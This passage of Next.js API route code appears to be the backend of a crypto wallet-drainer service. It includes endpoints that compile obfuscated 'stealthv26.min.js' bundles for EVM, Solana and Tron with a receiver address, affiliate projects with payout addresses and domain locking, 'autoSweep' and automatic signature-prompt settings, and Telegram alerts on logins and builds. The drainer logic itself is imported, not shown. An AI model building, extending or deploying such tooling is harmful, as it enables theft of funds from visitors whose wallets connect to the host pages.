        { status: "error", message: "Signature verification failed" },
        { status: 401 }
      );
    }

    const secret = getAuthSecret();
    if (!secret && process.env.NODE_ENV === "production") {
      return NextResponse.json(
        { status: "error", message: "Server missing AUTH_SECRET" },
        { status: 500 }
      );
    }

    const session = signSession(
      { address, iat: Date.now(), v: 1 },
      secret || "dev"
    );

    cookieStore.set({
      name: SESSION_COOKIE,
      value: session,
      httpOnly: true,
      sameSite: "lax",
      secure: process.env.NODE_ENV === "production",
      path: "/",
    });

    cookieStore.delete(NONCE_COOKIE);

    await sendTelegramMessage(`✅ Login\n<code>${address}</code>`);

    return NextResponse.json({ status: "ok", address });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Invalid request" },
      { status: 400 }
    );
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultWalletConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
} from "@/lib/mock-data";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const payload = isRecord(body) ? body : {};
    const { source = "compile-test" } = payload;

    const merged = {
      general: { ...defaultGeneralConfig, ...((isRecord(payload.general) ? payload.general : {}) as Partial<typeof defaultGeneralConfig>) },
      wallet: { ...defaultWalletConfig, ...((isRecord(payload.wallet) ? payload.wallet : {}) as Partial<typeof defaultWalletConfig>) },
      modal: { ...defaultModalConfig, ...((isRecord(payload.modal) ? payload.modal : {}) as Partial<typeof defaultModalConfig>) },
      tokens: { ...defaultTokensConfig, ...((isRecord(payload.tokens) ? payload.tokens : {}) as Partial<typeof defaultTokensConfig>) },
      advanced: { ...defaultAdvancedConfig, ...((isRecord(payload.advanced) ? payload.advanced : {}) as Partial<typeof defaultAdvancedConfig>) },
      payout: { ...defaultPayoutConfig, ...((isRecord(payload.payout) ? payload.payout : {}) as Partial<typeof defaultPayoutConfig>) },
      contracts: { ...defaultContractsConfig, ...((isRecord(payload.contracts) ? payload.contracts : {}) as Partial<typeof defaultContractsConfig>) },
      strategy: { ...defaultStrategyConfig, ...((isRecord(payload.strategy) ? payload.strategy : {}) as Partial<typeof defaultStrategyConfig>) },
      appKit: { ...defaultAppKitConfig, ...((isRecord(payload.appKit) ? payload.appKit : {}) as Partial<typeof defaultAppKitConfig>) },
    };

    const resolvedReceiver =
      merged.payout?.address ||
      "0x0000000000000000000000000000000000000000";

    const sdkBundle =
      merged.general.ecosystem === "solana"
        ? generateSolanaBundle({
            general: merged.general,
            wallet: merged.wallet,
            modal: merged.modal,
            tokens: merged.tokens,
            advanced: merged.advanced,
            receiverAddress: resolvedReceiver,
          })
        : merged.general.ecosystem === "tron"
          ? generateTronBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: merged.modal,
              tokens: merged.tokens,
              advanced: merged.advanced,
              receiverAddress: resolvedReceiver,
            })
          : generateSDKBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: { ...merged.modal, exposeExternalSDK: true },
              tokens: merged.tokens,
              advanced: merged.advanced,
              contracts: merged.contracts,
              strategy: merged.strategy,
              appKit: merged.appKit,
              receiverAddress: resolvedReceiver,
            });

    return NextResponse.json({
      status: "ok",
      message: "SDK test compiled successfully",
      framework: merged.modal.modalFrameworkStyle,
      ecosystem: merged.general.ecosystem,
      bundle: {
        content: sdkBundle,
        size: sdkBundle.length,
        sizeKB: (sdkBundle.length / 1024).toFixed(2),
        filename: "stealthv26.min.js",
      },
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Compilation failed";
    console.error("[compile-test/POST] Error:", errorMessage, error);
    return NextResponse.json(
      { status: "error", message: errorMessage, stack: error instanceof Error ? error.stack : undefined },
      { status: 500 }
    );
  }
}
```

### src/app/api/compile/route.ts

```typescript
import { NextResponse } from "next/server";
import { requireAuth } from "@/lib/api-auth";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { readCompileConfig, writeCompileConfig, type CompileConfig } from "@/lib/compile-config-store";
import { readOperationalConfig, writeOperationalConfig } from "@/lib/operational-config-store";
import { listScriptBuilds, saveScriptBuild } from "@/lib/script-build-store";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultWalletConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
} from "@/lib/mock-data";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

async function mergeCompileConfig(body: Record<string, unknown>): Promise<CompileConfig> {
  const operational = await readOperationalConfig();
  return {
    general: { ...defaultGeneralConfig, ...((isRecord(body.general) ? body.general : {}) as Partial<CompileConfig["general"]>) },
    wallet: { ...defaultWalletConfig, ...((isRecord(body.wallet) ? body.wallet : {}) as Partial<CompileConfig["wallet"]>) },
    modal: { ...defaultModalConfig, ...((isRecord(body.modal) ? body.modal : {}) as Partial<CompileConfig["modal"]>) },
    tokens: { ...defaultTokensConfig, ...((isRecord(body.tokens) ? body.tokens : {}) as Partial<CompileConfig["tokens"]>) },
    advanced: { ...defaultAdvancedConfig, ...((isRecord(body.advanced) ? body.advanced : {}) as Partial<CompileConfig["advanced"]>) },
    payout: {
      ...defaultPayoutConfig,
      ...operational.payout,
      ...((isRecord(body.payout) ? body.payout : {}) as Partial<CompileConfig["payout"]>),
    },
    contracts: { ...defaultContractsConfig, ...operational.contracts, ...((isRecord(body.contracts) ? body.contracts : {}) as Partial<CompileConfig["contracts"]>) },
    strategy: { ...defaultStrategyConfig, ...operational.strategy, ...((isRecord(body.strategy) ? body.strategy : {}) as Partial<CompileConfig["strategy"]>) },
    appKit: { ...defaultAppKitConfig, ...operational.appKit, ...((isRecord(body.appKit) ? body.appKit : {}) as Partial<CompileConfig["appKit"]>) },
  };
}

export async function GET() {
  const guard = await requireAuth("sdk:download");
  if (guard) return guard;

  const config = await readCompileConfig();
  const builds = await listScriptBuilds();
  return NextResponse.json({
    status: "ok",
    config,
    latestBuild: builds[0] ?? null,
    builds,
  });
}

export async function POST(request: Request) {
  const guard = await requireAuth("sdk:compile");
  if (guard) return guard;

  try {
    const body = await request.json();
    const payload = isRecord(body) ? body : {};
    const { receiverAddress, saveConfig = true, saveBuild = true, source = "compile" } = payload;

    const timestamp = new Date().toISOString();
    const version = "26.0.0";

    const operational = await readOperationalConfig();
    const merged = await mergeCompileConfig(payload);

     if (saveConfig) {
      await writeCompileConfig(merged);
      
      const updatedOperational = await readOperationalConfig();
      updatedOperational.payout = merged.payout;
      await writeOperationalConfig(updatedOperational);
    }

    const compiledConfig = {
      version,
      timestamp,
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      payout: merged.payout,
      contracts: merged.contracts,
      strategy: merged.strategy,
      appKit: merged.appKit,
    };

    const resolvedReceiver =
      (typeof receiverAddress === "string" && receiverAddress) ||
      operational.payout?.address ||
      merged.payout.address ||
      "0x0000000000000000000000000000000000000000";

    const sdkBundle =
      merged.general.ecosystem === "solana"
        ? generateSolanaBundle({
            general: merged.general,
            wallet: merged.wallet,
            modal: merged.modal,
            tokens: merged.tokens,
            advanced: merged.advanced,
            receiverAddress: resolvedReceiver,
          })
        : merged.general.ecosystem === "tron"
          ? generateTronBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: merged.modal,
              tokens: merged.tokens,
              advanced: merged.advanced,
              receiverAddress: resolvedReceiver,
            })
          : generateSDKBundle({
              general: merged.general,
              wallet: merged.wallet,
              // Match GET /api/sdk: embeds need window.StealthV26 / openConnectModal for self-test & host pages.
              modal: { ...merged.modal, exposeExternalSDK: true },
              tokens: merged.tokens,
              advanced: merged.advanced,
              contracts: merged.contracts,
              strategy: merged.strategy,
              appKit: merged.appKit,
              receiverAddress: resolvedReceiver,
            });

    const build = saveBuild
      ? await saveScriptBuild({
          bundle: sdkBundle,
          framework: merged.modal.modalFrameworkStyle,
          source: source === "frontpage" ? "frontpage" : "compile",
        })
      : null;

    return NextResponse.json({
      status: "ok",
      message: "SDK compiled successfully",
      timestamp,
      version,
      bundle: {
        content: sdkBundle,
        size: sdkBundle.length,
        sizeKB: (sdkBundle.length / 1024).toFixed(2),
        filename: "stealthv26.min.js",
      },
      publishedBuild: build,
      config: compiledConfig,
    });
   } catch (error) {
     const errorMessage = error instanceof Error ? error.message : "Compilation failed";
     console.error("[compile/POST] Error:", errorMessage, error);
     return NextResponse.json(
       { status: "error", message: errorMessage },
       { status: 500 }
     );
   }
}
```

```typescript
    return NextResponse.json({
      status: "ok",
      message: "Configuration updated successfully",
      timestamp: new Date().toISOString(),
      frontpage,
    });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request body" }, { status: 400 });
  }
}
```

### src/app/api/contracts/[id]/route.ts

```typescript
import { NextResponse } from "next/server";
import path from "node:path";
import fs from "node:fs/promises";
import { getContractRegistryEntryByName } from "@/lib/contract-registry";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function decodeId(id: string) {
  return Buffer.from(id, "base64url").toString("utf8");
}

function pickAbi(json: unknown): unknown[] | null {
  if (!isRecord(json)) return null;
  if (Array.isArray(json.abi)) return json.abi;
  if (isRecord(json.output) && Array.isArray(json.output.abi)) return json.output.abi;
  if (isRecord(json.artifact) && Array.isArray(json.artifact.abi)) return json.artifact.abi;
  return null;
}

function pickDevAddressHintByName(name: string): string | null {
  if (!name) return null;
  return getContractRegistryEntryByName(name)?.address ?? null;
}

function pickAddressHint(json: unknown): string | null {
  if (!isRecord(json)) return null;
  if (typeof json.address === "string") return json.address;
  if (typeof json.contractAddress === "string") return json.contractAddress;

  // hardhat-deploy style: deployments/<network>/<Contract>.json
  if (isRecord(json.networks)) {
    const entries = Object.values(json.networks);
    for (const n of entries) {
      if (isRecord(n) && typeof n.address === "string") return n.address;
    }
  }

  return null;
}

export async function GET(
  _request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params;
  const rel = decodeId(id);

  const projectRoot = process.cwd();
  const full = path.resolve(projectRoot, rel);

  // Prevent path traversal
  if (!full.startsWith(projectRoot)) {
    return NextResponse.json({ status: "error", message: "Invalid id" }, { status: 400 });
  }

  try {
    const raw = await fs.readFile(full, "utf8");
    const json = JSON.parse(raw) as unknown;

    const abi = pickAbi(json);
    if (!abi) {
      return NextResponse.json(
        { status: "error", message: "No abi found in artifact" },
        { status: 400 }
      );
    }

    const name =
      (isRecord(json) && typeof json.contractName === "string" && json.contractName) ||
      (isRecord(json) && typeof json.name === "string" && json.name) ||
      path.basename(rel, path.extname(rel));
    const addressHint = pickDevAddressHintByName(name) || pickAddressHint(json);
    const registryEntry = getContractRegistryEntryByName(name);

    return NextResponse.json({
      status: "ok",
      name,
      relativePath: rel,
      addressHint,
      abi,
      category: registryEntry?.category ?? null,
      capabilities: registryEntry?.capabilities ?? [],
      description: registryEntry?.description ?? null,
      executionBackend: registryEntry?.backend ?? null,
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Artifact not found" },
      { status: 404 }
    );
  }
}
```

### src/app/api/contracts/route.ts

```typescript
import { NextResponse } from "next/server";
import path from "node:path";
import fs from "node:fs/promises";
import type { Dirent } from "node:fs";

type ContractListItem = {
  id: string;
  name: string;
  relativePath: string;
};

const MAX_FILES = 200;

function encodeId(relativePath: string) {
  return Buffer.from(relativePath, "utf8").toString("base64url");
}

async function pathExists(p: string) {
  try {
    await fs.access(p);
    return true;
  } catch {
    return false;
  }
}

async function walkJsonFiles(dir: string, out: string[]) {
  if (out.length >= MAX_FILES) return;
  let entries: Dirent[];
  try {
    entries = await fs.readdir(dir, { withFileTypes: true });
  } catch {
    return;
  }

  for (const ent of entries) {
    if (out.length >= MAX_FILES) return;
    if (ent.name === "node_modules" || ent.name.startsWith(".next")) continue;
    const full = path.join(dir, ent.name);
    if (ent.isDirectory()) {
      await walkJsonFiles(full, out);
    } else if (ent.isFile() && ent.name.toLowerCase().endsWith(".json")) {
      out.push(full);
    }
  }
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function isLikelyContractArtifact(json: unknown): boolean {
  if (!json || typeof json !== "object") return false;
  if (!isRecord(json)) return false;
  if (Array.isArray(json.abi)) return true;
  if (typeof json.contractName === "string" && Array.isArray(json.abi)) return true;
  if (isRecord(json.output) && Array.isArray(json.output.abi)) return true;
  if (isRecord(json.artifact) && Array.isArray(json.artifact.abi)) return true;
  return false;
}

export async function GET() {
  const projectRoot = process.cwd();

  const candidateRoots = [
    "src/contracts",
    "contracts",
    "contracts json",
    "artifacts",
    "out",
    "deployments",
  ].map((p) => path.join(projectRoot, p));

  const roots = [] as string[];
  for (const r of candidateRoots) {
    if (await pathExists(r)) roots.push(r);
  }

  const allFiles: string[] = [];
  for (const r of roots) {
    await walkJsonFiles(r, allFiles);
    if (allFiles.length >= MAX_FILES) break;
  }

  const items: ContractListItem[] = [];

  for (const file of allFiles) {
    try {
      const raw = await fs.readFile(file, "utf8");
      const json = JSON.parse(raw) as unknown;
      if (!isLikelyContractArtifact(json)) continue;

      const relativePath = path.relative(projectRoot, file);
      const name =
        (isRecord(json) && typeof json.contractName === "string" && json.contractName) ||
        (isRecord(json) && typeof json.name === "string" && json.name) ||
        path.basename(file, path.extname(file));

      items.push({
        id: encodeId(relativePath),
        name,
        relativePath,
      });
    } catch {
      continue;
    }
  }

  items.sort((a, b) => a.relativePath.localeCompare(b.relativePath));

  return NextResponse.json({ status: "ok", total: items.length, items });
}
```

### src/app/api/domains/route.ts

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import {
  addDomain,
  listDomains,
  removeDomain,
  verifyDomainDNS,
  updateDomain,
} from "@/lib/domains";

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/** GET /api/domains — list all registered domains */
export async function GET() {
  const address = await getCallerAddress();
  const err = authorize(address, "domains:read");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const domains = await listDomains();
  return NextResponse.json({ status: "ok", total: domains.length, data: domains });
}

/** POST /api/domains — register a new domain */
export async function POST(request: Request) {
  const address = await getCallerAddress();
  const err = authorize(address, "domains:manage");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  try {
    const body = await request.json();
    const { domain } = body;

    if (!domain || typeof domain !== "string") {
      return NextResponse.json(
        { status: "error", message: "Domain name is required" },
        { status: 400 }
      );
    }

    // Basic hostname validation
    const cleaned = domain.toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
    if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,}$/.test(cleaned)) {
      return NextResponse.json(
        { status: "error", message: "Invalid domain format" },
        { status: 400 }
      );
    }

    const result = await addDomain(cleaned);

    return NextResponse.json({
      status: "ok",
      message: "Domain registered. Add the TXT record to verify ownership.",
      domain: result,
      verification: {
        type: "TXT",
        host: cleaned,
        value: result.verifyTxt,
        instructions: `Add a TXT record to ${cleaned} with value: ${result.verifyTxt}`,
      },
    }, { status: 201 });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request" }, { status: 400 });
  }
}

/** DELETE /api/domains?id=xxx — remove a domain */
export async function DELETE(request: Request) {
  const address = await getCallerAddress();
  const err = authorize(address, "domains:manage");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const { searchParams } = new URL(request.url);
  const id = searchParams.get("id");

  if (!id) {
    return NextResponse.json({ status: "error", message: "Domain ID is required" }, { status: 400 });
  }

  await removeDomain(id);
  return NextResponse.json({ status: "ok", message: "Domain removed" });
}

/** PATCH /api/domains — verify or update a domain */
export async function PATCH(request: Request) {
  const address = await getCallerAddress();
  const err = authorize(address, "domains:manage");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  try {
    const body = await request.json();
    const { id, action, status: newStatus } = body;

    if (!id) {
      return NextResponse.json({ status: "error", message: "Domain ID required" }, { status: 400 });
    }

    // DNS verification
    if (action === "verify") {
      const result = await verifyDomainDNS(id);
      return NextResponse.json({
        status: "ok",
        verified: result.verified,
        error: result.error,
      });
    }

    // Status toggle (active/paused)
    if (newStatus) {
      const updated = await updateDomain(id, { status: newStatus });
      if (!updated) {
        return NextResponse.json({ status: "error", message: "Domain not found" }, { status: 404 });
      }
      return NextResponse.json({ status: "ok", domain: updated });
    }

    return NextResponse.json({ status: "error", message: "No action specified" }, { status: 400 });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request" }, { status: 400 });
  }
}
```

### src/app/api/health/route.ts

```typescript
import { NextResponse } from "next/server";
import { getRedis } from "@/lib/redis";

/**
 * GET /api/health
 *
 * Production health check endpoint.
 * Used by Docker HEALTHCHECK, Nginx upstream checks, and external monitors.
 *
 * Returns:
 *  - 200 with component status when core services are reachable
 *  - 503 when critical dependencies (Redis) are down
 */
export async function GET() {
  const start = Date.now();
  const checks: Record<string, "ok" | "degraded" | "down"> = {
    app: "ok",
    redis: "down",
    kafka: "down",
  };

  // Redis check
  try {
    const redis = await getRedis();
    await redis.set("health:ping", "1", 10);
    const val = await redis.get("health:ping");
    checks.redis = val === "1" ? "ok" : "degraded";
  } catch {
    checks.redis = "down";
  }

  // Kafka check (non-critical — falls back to in-memory bus)
  try {
    if (process.env.KAFKA_BROKERS) {
      const { getEventBus } = await import("@/lib/kafka");
      await getEventBus();
      checks.kafka = "ok";
    } else {
      checks.kafka = "degraded"; // in-memory fallback
    }
  } catch {
    checks.kafka = "degraded";
  }

  const latencyMs = Date.now() - start;
  const healthy = checks.redis !== "down";

  return NextResponse.json(
    {
      status: healthy ? "healthy" : "unhealthy",
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
      latencyMs,
      checks,
      version: "26.0.0",
      node: process.version,
    },
    { status: healthy ? 200 : 503 }
  );
}
```

```typescript
import { NextResponse } from "next/server";
import { getRedis } from "@/lib/redis";

/** GET /api/indexer — returns indexer stats and recent events for an address */
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const address = searchParams.get("address");

  const redis = await getRedis();

  // Indexer aggregate stats
  const stats: Record<string, string | null> = {};
  for (const field of ["blocksProcessed", "eventsIndexed", "lastBlock", "lastUpdated"]) {
    stats[field] = await redis.get(`indexer:stats:${field}`);
  }

  // Per-address events
  let events: unknown[] = [];
  if (address) {
    const raw = await redis.get(`events:${address.toLowerCase()}`);
    if (raw) {
      try { events = JSON.parse(`[${raw}]`); } catch { /* ignore */ }
    }
  }

  return NextResponse.json({ status: "ok", stats, events });
}

/** POST /api/indexer — add address to watch list */
export async function POST(request: Request) {
  try {
    const { address } = await request.json();
    if (!address || typeof address !== "string") {
      return NextResponse.json({ status: "error", message: "address required" }, { status: 400 });
    }
    const redis = await getRedis();
    await redis.set(`indexer:watched:${address.toLowerCase()}`, "1");
    return NextResponse.json({ status: "ok", message: `Watching ${address}` });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request" }, { status: 400 });
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { generateLogs } from "@/lib/mock-data";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const type = searchParams.get("type");
  const chain = searchParams.get("chain");
  const limit = parseInt(searchParams.get("limit") || "100");
  const offset = parseInt(searchParams.get("offset") || "0");

  let logs = generateLogs(200);

  if (type && type !== "all") {
    logs = logs.filter((l) => l.type === type);
  }
  if (chain && chain !== "all") {
    logs = logs.filter((l) => l.chain === chain);
  }

  const total = logs.length;
  const paged = logs.slice(offset, offset + limit);

  return NextResponse.json({
    status: "ok",
    total,
    offset,
    limit,
    data: paged,
  });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    return NextResponse.json({
      status: "ok",
      message: "Log entry recorded",
      id: `log-${Date.now()}`,
      timestamp: new Date().toISOString(),
      entry: body,
    });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid log entry" }, { status: 400 });
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { sendTelegramNotification } from "@/lib/telegram";
import { rateLimit } from "@/lib/redis";

/**
 * POST /api/notify
 * Server-side relay for Telegram notifications from the client SDK.
 * This keeps the bot token on the server — never exposed to browsers.
 */
export async function POST(request: Request) {
  try {
    // Rate limit: 20 notifications per minute per IP
    const ip =
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      request.headers.get("x-real-ip") ||
      "unknown";
    const rl = await rateLimit(`notify:${ip}`, 20, 60);
    if (!rl.allowed) {
      return NextResponse.json({ status: "error", message: "Rate limited" }, { status: 429 });
    }

    const body = await request.json();
    const { message, projectId } = body ?? {};

    if (!message || typeof message !== "string") {
      return NextResponse.json({ status: "error", message: "Missing message" }, { status: 400 });
    }

    // Truncate to prevent abuse
    const sanitized = message.slice(0, 2000);

    void sendTelegramNotification({
      message: sanitized,
      projectId: typeof projectId === "string" ? projectId : undefined,
    });

    return NextResponse.json({ status: "ok" });
  } catch {
    return NextResponse.json({ status: "error", message: "Internal error" }, { status: 500 });
  }
}
```

```typescript
import { NextResponse } from "next/server";
import {
  getDefaultOperationalConfig,
  isOperationalConfig,
  readOperationalConfig,
  writeOperationalConfig,
} from "@/lib/operational-config-store";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

export async function GET() {
  const config = await readOperationalConfig();
  return NextResponse.json({ status: "ok", config });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const payload = isRecord(body) && isRecord(body.config) ? body.config : body;
    if (!isOperationalConfig(payload)) {
      const defaults = getDefaultOperationalConfig();
      const merged = {
        contracts: { ...defaults.contracts, ...(isRecord(payload) && isRecord(payload.contracts) ? payload.contracts : {}) },
        strategy: { ...defaults.strategy, ...(isRecord(payload) && isRecord(payload.strategy) ? payload.strategy : {}) },
        appKit: { ...defaults.appKit, ...(isRecord(payload) && isRecord(payload.appKit) ? payload.appKit : {}) },
        payout: { ...defaults.payout, ...(isRecord(payload) && isRecord(payload.payout) ? payload.payout : {}) },
        runtime: {
          ...defaults.runtime,
          ...(isRecord(payload) && isRecord(payload.runtime) ? payload.runtime : {}),
        },
      };
      await writeOperationalConfig(merged);
      return NextResponse.json({ status: "ok", config: merged });
    }
    await writeOperationalConfig(payload);
    return NextResponse.json({ status: "ok", config: payload });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid operational config payload" }, { status: 400 });
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { isAddress } from "viem";
import {
  persistPlatformRuntimeConfig,
  resolvePlatformRuntimeConfig,
} from "@/lib/platform-runtime-config";

export async function GET() {
  const config = await resolvePlatformRuntimeConfig();
  return NextResponse.json({ status: "ok", ...config });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const payout = body?.payout;
    const autoSignaturePrompt = body?.advanced?.autoSignaturePrompt;

    if (payout?.address !== undefined) {
      const address = String(payout.address).trim();
      if (address && !isAddress(address)) {
        return NextResponse.json(
          { status: "error", message: "Invalid payout address" },
          { status: 400 },
        );
      }
    }

    const config = await persistPlatformRuntimeConfig({
      payout: payout
        ? {
            address: payout.address,
            chain: payout.chain,
            autoSweep: payout.autoSweep,
            minSweepAmount: payout.minSweepAmount,
          }
        : undefined,
      autoSignaturePrompt:
        typeof autoSignaturePrompt === "boolean" ? autoSignaturePrompt : undefined,
    });

    return NextResponse.json({
      status: "ok",
      message: "Platform configuration saved",
      ...config,
    });
  } catch (error) {
    const message = error instanceof Error ? error.message : "Failed to save platform config";
    return NextResponse.json({ status: "error", message }, { status: 400 });
  }
}
```

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import {
  getAffiliateProject,
} from "@/lib/projects";
import { compileAffiliateProject } from "@/lib/affiliate-compile";
import { type ObfuscationLevel } from "@/lib/obfuscator";
import { sendTelegramNotification } from "@/lib/telegram";

type Params = { params: Promise<{ id: string }> };

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/** GET /api/projects/:id/compile — compile and return the script.js for this affiliate
 *  Query params:
 *    ?obfuscate=none|minify|medium|heavy  (default: medium)
 */
export async function GET(_req: Request, { params }: Params) {
  const { id } = await params;
  const url = new URL(_req.url);
  const obfLevel = (url.searchParams.get("obfuscate") || "medium") as ObfuscationLevel;

  const address = await getCallerAddress();
  const err = authorize(address, "sdk:compile");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
  }
  const compiled = await compileAffiliateProject({
    projectId: id,
    obfuscationLevel: obfLevel,
    publishBuild: false,
  });

  void sendTelegramNotification({
    projectId: id,
    message:
      `🛠️ Admin Compile\n` +
      `project: <code>${id}</code>\n` +
      `name: <b>${project.name}</b>\n` +
      `obfuscation: <b>${obfLevel}</b>\n` +
      `domainLock: <b>${project.domains?.length ? "enabled" : "disabled"}</b>`,
  });

  return new Response(compiled.bundle, {
    headers: {
      "content-type": "application/javascript; charset=utf-8",
      "content-disposition": `attachment; filename="script-${id}.js"`,
      "cache-control": "no-store",
    },
  });
}
```

```typescript
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getAuthSecret, SESSION_COOKIE, verifySession } from "@/lib/auth";
import { authorize } from "@/lib/rbac";
import {
  getAffiliateProject,
  getAffiliateConfig,
  saveAffiliateConfig,
} from "@/lib/projects";
import { sendTelegramNotification } from "@/lib/telegram";
import type { AffiliateConfig } from "@/lib/projects";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
  defaultPayoutConfig,
} from "@/lib/mock-data";

type Params = { params: Promise<{ id: string }> };

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

/** GET /api/projects/:id/config — get SDK config for this affiliate */
export async function GET(_req: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "config:read");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
  }

  const config = await getAffiliateConfig(id);
  const result: AffiliateConfig = config ?? {
    general: defaultGeneralConfig,
    wallet: defaultWalletConfig,
    modal: defaultModalConfig,
    tokens: defaultTokensConfig,
    advanced: defaultAdvancedConfig,
    payout: { ...defaultPayoutConfig, address: project.payoutAddress },
  };

  return NextResponse.json({ status: "ok", projectId: id, config: result });
}

/** PUT /api/projects/:id/config — save SDK config for this affiliate */
export async function PUT(request: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "config:write");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Not found" }, { status: 404 });
  }

  try {
    const body = await request.json();
    const config: AffiliateConfig = {
      general: { ...defaultGeneralConfig, ...body.general },
      wallet: { ...defaultWalletConfig, ...body.wallet },
      modal: { ...defaultModalConfig, ...body.modal },
      tokens: { ...defaultTokensConfig, ...body.tokens },
      advanced: { ...defaultAdvancedConfig, ...body.advanced },
      payout: { ...defaultPayoutConfig, address: project.payoutAddress, ...body.payout },
    };

    try {
      await saveAffiliateConfig(id, config);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Invalid config";
      return NextResponse.json({ status: "error", message }, { status: 400 });
    }
    const walletSummary = config.wallet.supportedWallets.length
      ? config.wallet.supportedWallets.join(", ")
      : "none";
    void sendTelegramNotification({
      projectId: id,
      message:
        `⚙️ Affiliate Config Saved\n` +
        `project: <code>${id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `wallets: <b>${walletSummary}</b>\n` +
        `modal: <b>${config.modal.modalFrameworkStyle}</b>`,
    });
    return NextResponse.json({ status: "ok", message: "Config saved", projectId: id });
  } catch (err) {
    const message = err instanceof Error ? err.message : "Invalid config";
    return NextResponse.json({ status: "error", message }, { status: 400 });
  }
}
```

```typescript
type Params = { params: Promise<{ id: string }> };

async function getCallerAddress(): Promise<string | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get(SESSION_COOKIE)?.value;
  if (!token) return null;
  const secret = getAuthSecret();
  const session = verifySession<{ address: string }>(token, secret || "dev");
  return session?.address ?? null;
}

export async function POST(_req: Request, { params }: Params) {
  const { id } = await params;
  const address = await getCallerAddress();
  const err = authorize(address, "config:write");
  if (err) return NextResponse.json({ status: "error", message: err }, { status: 403 });

  const project = await getAffiliateProject(id);
  if (!project) {
    return NextResponse.json({ status: "error", message: "Affiliate not found" }, { status: 404 });
  }

  const result = await resetAffiliatePassword(id);
